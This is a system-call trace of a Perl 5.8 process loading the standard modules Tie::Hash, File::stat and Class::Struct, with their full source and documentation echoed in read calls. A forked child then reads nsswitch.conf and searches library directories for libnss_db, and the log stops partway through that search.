12207 20:24:33.320056 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.320070 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.320092 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
12207 20:24:33.320114 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:33.320129 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:33.320141 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:33.320160 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
12207 20:24:33.320566 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
12207 20:24:33.321147 read(8, "", 4096) = 0
12207 20:24:33.321164 close(8)          = 0
12207 20:24:33.321202 stat64("/etc/perl/File/stat.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321218 stat64("/etc/perl/File/stat.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321232 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321245 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321259 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321272 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321287 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321299 stat64("/usr/lib/perl5/File/stat.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321312 stat64("/usr/share/perl5/File/stat.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321325 stat64("/usr/share/perl5/File/stat.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321339 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321352 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321366 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321379 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
12207 20:24:33.321410 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:33.321465 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:33.321477 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:33.321495 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
12207 20:24:33.321909 stat64("/etc/perl/Class/Struct.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:33.321968 stat64("/etc/perl/Class/Struct.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:33.321989 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:33.322003 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:33.322018 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:33.322031 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:33.322046 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:33.322058 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:33.322071 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:33.322084 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:33.322098 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:33.322111 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:33.322125 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:33.322139 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
12207 20:24:33.322161 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
12207 20:24:33.322177 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaa5b8) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:33.322189 _llseek(10, 0, [0], SEEK_CUR) = 0
12207 20:24:33.322208 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
12207 20:24:33.322512 brk(0x82de000)    = 0x82de000
12207 20:24:33.322882 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
12207 20:24:33.323452 _llseek(10, 6916, [6916], SEEK_SET) = 0
12207 20:24:33.323473 _llseek(10, 0, [6916], SEEK_CUR) = 0
12207 20:24:33.323484 close(10)         = 0
12207 20:24:33.323664 _llseek(8, 1334, [1334], SEEK_SET) = 0
12207 20:24:33.323680 _llseek(8, 0, [1334], SEEK_CUR) = 0
12207 20:24:33.323691 close(8)          = 0
12207 20:24:33.324330 brk(0x82ff000)    = 0x82ff000
12207 20:24:33.324476 _llseek(6, 2689, [2689], SEEK_SET) = 0
12207 20:24:33.324493 _llseek(6, 0, [2689], SEEK_CUR) = 0
12207 20:24:33.324503 close(6)          = 0
12207 20:24:33.324657 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d3e908) = 12208
12208 20:24:33.369974 getppid()         = 12207
12208 20:24:33.370496 open("/etc/nsswitch.conf", O_RDONLY) = 6
12208 20:24:33.370536 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12208 20:24:33.370557 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f04000
12208 20:24:33.370573 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12208 20:24:33.370625 read(6, "", 4096) = 0
12208 20:24:33.370635 close(6)          = 0
12208 20:24:33.370646 munmap(0xb7f04000, 4096) = 0
12208 20:24:33.370674 open("/etc/ld.so.cache", O_RDONLY) = 6
12208 20:24:33.370688 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12208 20:24:33.370705 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d0b000
12208 20:24:33.370717 close(6)          = 0
12208 20:24:33.370728 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12208 20:24:33.370746 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.370761 stat64("/lib/tls/i686/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.370775 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.370789 stat64("/lib/tls/i686/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.370801 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.370815 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12208 20:24:33.370833 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.370846 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12208 20:24:33.370874 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.370932 stat64("/lib/tls/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.370944 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.370956 stat64("/lib/tls/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.370968 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.370980 stat64("/lib/tls/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.370991 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371003 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12208 20:24:33.371021 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371033 stat64("/lib/i686/sse2/cmov", 0xbfcab13c) = -1 ENOENT (No such file or directory)
12208 20:24:33.371045 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12208 20:24:33.371057 stat64("/lib/i686/sse2", 0xbfcab13c) = -1 ENOENT (No such file or directory)
